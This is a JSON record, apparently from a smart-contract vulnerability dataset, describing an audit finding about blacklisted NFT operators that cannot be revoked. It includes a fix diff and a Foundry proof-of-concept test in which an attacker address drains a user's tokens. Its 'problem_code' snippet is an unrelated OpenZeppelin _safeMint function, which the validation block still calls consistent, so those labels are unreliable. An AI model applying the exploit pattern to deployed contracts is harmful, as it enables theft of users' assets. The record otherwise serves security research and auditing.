@@ -1,0 +1,111 @@
+{
+  "id": "64682",
+  "extraction_type": "github_complete",
+  "source_url": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol",
+  "is_complete": true,
+  "tier": "tier_1",
+  "referenced_lines": [
+    [
+      280,
+      280
+    ]
+  ],
+  "filename": "64682_ERC721.sol",
+  "has_pragma": true,
+  "has_contract": true,
+  "has_function": true,
+  "balanced_braces": true,
+  "num_lines": 433,
+  "vulnerability_title": "[H-02] Blacklisted Operators Can Not Be Revoked from Being an Operator",
+  "recommendation": {
+    "has_recommendation": true,
+    "recommendation_text": "1. Allow revocation even if the operator is blacklisted (only block when setting `approved == true`).\n2. Block blacklisted callers from managing approvals (e.g., revert in `approve()` and `setApprovalForAll()` when `msg.sender` is blacklisted), so a blacklisted operator cannot delegate approvals to an unblacklisted attacker.\n\nFile: [sRWA.sol](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/sRWA.sol)\n\n```diff\nfunction approve(address to, uint256 tokenId) public virtual override {\n+  if (_isBlacklisted[msg.sender]) revert Blacklisted();\n   if (_isBlacklisted[to]) revert Blacklisted();\n      super.approve(to, tokenId);\n   }\n}\n\nfunction setApprovalForAll(address operator, bool approved) public virtual override {\n-     if (_isBlacklisted[operator]) revert Blacklisted();\n+     if (_isBlacklisted[operator] && approved == true) revert Blacklisted();\n         super.setApprovalForAll(operator, approved);\n      }\n}\n```",
+    "fix_code_blocks": [
+      "function approve(address to, uint256 tokenId) public virtual override {\n+  if (_isBlacklisted[msg.sender]) revert Blacklisted();\n   if (_isBlacklisted[to]) revert Blacklisted();\n      super.approve(to, tokenId);\n   }\n}\n\nfunction setApprovalForAll(address operator, bool approved) public virtual override {\n-     if (_isBlacklisted[operator]) revert Blacklisted();\n+     if (_isBlacklisted[operator] && approved == true) revert Blacklisted();\n         super.setApprovalForAll(operator, approved);\n      }\n}"
+    ]
+  },
+  "poc": {
+    "has_poc": true,
+    "poc_text": "Run it in `test/System.t.sol`\n\n```solidity\nfunction test_POC_BlacklistedOperator_CannotBeRevoked_AndCanStealViaApprove() public {\n    address router = makeAddr(\"router\");\n    address attacker = makeAddr(\"attacker\");\n\n    // Mint 9 more tokens so `user` owns 10 NFTs total (tokenIds 1..10)\n    vm.startPrank(owner);\n    rwa.mint(user, \"UUID-124\");\n    rwa.mint(user, \"UUID-125\");\n    rwa.mint(user, \"UUID-126\");\n    rwa.mint(user, \"UUID-127\");\n    rwa.mint(user, \"UUID-128\");\n    rwa.mint(user, \"UUID-129\");\n    rwa.mint(user, \"UUID-130\");\n    rwa.mint(user, \"UUID-131\");\n    rwa.mint(user, \"UUID-132\");\n    vm.stopPrank();\n\n    // 1) user makes router an operator\n    vm.prank(user);\n    rwa.setApprovalForAll(router, true);\n    assertTrue(rwa.isApprovedForAll(user, router));\n\n    // 2) admin blacklists the operator/router address\n    vm.prank(owner);\n    rwa.blacklistContract(router);\n    assertTrue(rwa.isBlacklisted(router));\n\n    // 3) user attempts to revoke operator approval, but it reverts\n    vm.prank(user);\n    vm.expectRevert(RWA.Blacklisted.selector);\n    rwa.setApprovalForAll(router, false);\n\n    // 4) blacklisted router approves an unblacklisted attacker for each tokenId\n    for (uint256 tokenId = 1; tokenId <= 10; tokenId++) {\n        vm.prank(router);\n        rwa.approve(attacker, tokenId);\n        assertEq(rwa.getApproved(tokenId), attacker);\n    }\n\n    // 5) attacker pulls the tokens and becomes the owner\n    for (uint256 tokenId = 1; tokenId <= 10; tokenId++) {\n        vm.prank(attacker);\n        rwa.transferFrom(user, attacker, tokenId);\n        assertEq(rwa.ownerOf(tokenId), attacker);\n    }\n}\n```",
+    "poc_code_blocks": [
+      "function test_POC_BlacklistedOperator_CannotBeRevoked_AndCanStealViaApprove() public {\n    address router = makeAddr(\"router\");\n    address attacker = makeAddr(\"attacker\");\n\n    // Mint 9 more tokens so `user` owns 10 NFTs total (tokenIds 1..10)\n    vm.startPrank(owner);\n    rwa.mint(user, \"UUID-124\");\n    rwa.mint(user, \"UUID-125\");\n    rwa.mint(user, \"UUID-126\");\n    rwa.mint(user, \"UUID-127\");\n    rwa.mint(user, \"UUID-128\");\n    rwa.mint(user, \"UUID-129\");\n    rwa.mint(user, \"UUID-130\");\n    rwa.mint(user, \"UUID-131\");\n    rwa.mint(user, \"UUID-132\");\n    vm.stopPrank();\n\n    // 1) user makes router an operator\n    vm.prank(user);\n    rwa.setApprovalForAll(router, true);\n    assertTrue(rwa.isApprovedForAll(user, router));\n\n    // 2) admin blacklists the operator/router address\n    vm.prank(owner);\n    rwa.blacklistContract(router);\n    assertTrue(rwa.isBlacklisted(router));\n\n    // 3) user attempts to revoke operator approval, but it reverts\n    vm.prank(user);\n    vm.expectRevert(RWA.Blacklisted.selector);\n    rwa.setApprovalForAll(router, false);\n\n    // 4) blacklisted router approves an unblacklisted attacker for each tokenId\n    for (uint256 tokenId = 1; tokenId <= 10; tokenId++) {\n        vm.prank(router);\n        rwa.approve(attacker, tokenId);\n        assertEq(rwa.getApproved(tokenId), attacker);\n    }\n\n    // 5) attacker pulls the tokens and becomes the owner\n    for (uint256 tokenId = 1; tokenId <= 10; tokenId++) {\n        vm.prank(attacker);\n        rwa.transferFrom(user, attacker, tokenId);\n        assertEq(rwa.ownerOf(tokenId), attacker);\n    }\n}"
+    ]
+  },
+  "problem_code": {
+    "has_problem_code": true,
+    "source": "github_line_refs_function_scope",
+    "snippets": [
+      {
+        "function_name": "_safeMint",
+        "start_line": 279,
+        "end_line": 281,
+        "code": "    function _safeMint(address to, uint256 tokenId) internal {\n        _safeMint(to, tokenId, \"\");\n    }",
+        "confidence": 97,
+        "reason": "Function enclosing GitHub-referenced vulnerable line",
+        "matched_references": [
+          [
+            280,
+            280
+          ]
+        ]
+      }
+    ]
+  },
+  "extraction_date": "2026-04-16T16:58:13.177440",
+  "validation": {
+    "content_code_consistency": {
+      "consistent": true,
+      "confidence": 95,
+      "summary_matches": true,
+      "content_matches": true,
+      "summary_reasoning": "The summary accurately describes the issue of blacklisted operators being able to manage approvals, which is reflected in the provided code snippets.",
+      "content_reasoning": "The content mentions the relevant functions and variables (_isBlacklisted, setApprovalForAll, approve) that are present in the code, and the described vulnerable patterns (reverting on blacklisted operators) are indeed present.",
+      "functions_found": [
+        "setApprovalForAll",
+        "approve"
+      ],
+      "variables_found": [
+        "_isBlacklisted"
+      ],
+      "patterns_found": [
+        "blacklisted operator approval management"
+      ],
+      "issues": []
+    },
+    "report_tag_validation": {
+      "existing_tag": "None",
+      "tag_present": false,
+      "tag_correct": false,
+      "confidence": 90,
+      "reasoning": "The report lacks a tag that reflects the nature of the vulnerability, which is related to access control and operator management.",
+      "suggested_tag": "Access Control",
+      "alternative_tags": [
+        "NFT Security",
+        "Operator Management"
+      ],
+      "correction_explanation": "A tag related to access control is appropriate as the vulnerability involves unauthorized actions by blacklisted operators."
+    },
+    "mando_classification": {
+      "primary_category": "access_control",
+      "secondary_categories": [],
+      "confidence": 90,
+      "mando_applicable": true,
+      "reasoning": "The vulnerability directly relates to access control issues, specifically regarding the management of operator approvals and blacklisted addresses."
+    },
+    "scsvs_classification": {
+      "primary_category": "G5",
+      "primary_category_name": "Access control",
+      "secondary_categories": [
+        "C6"
+      ],
+      "confidence": 90,
+      "use_scsvs_instead": true,
+      "reasoning": "SCSVS provides a more granular classification, and G5 accurately captures the access control issues while C6 highlights the NFT context of the vulnerability.",
+      "vulnerability_type": "Access control issue allowing blacklisted operators to manage approvals"
+    },
+    "fix_code_source": "provided",
+    "validated_at": "2026-04-16T17:15:30.826987",
+    "model": "gpt-4o-mini",
+    "code_input_source": "github_line_refs_function_scope"
+  }
+}
